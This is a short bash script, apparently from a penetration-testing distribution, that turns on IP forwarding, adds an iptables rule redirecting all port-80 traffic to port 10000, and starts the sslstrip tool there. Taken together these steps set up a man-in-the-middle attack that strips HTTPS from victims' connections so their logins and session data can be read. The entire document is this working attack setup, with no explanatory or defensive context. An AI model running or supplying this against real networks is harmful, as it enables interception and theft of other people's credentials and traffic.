#! /bin/bash
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sleep 2
cd /pentest/web/sslstrip 
python ./sslstrip.py -l 10000

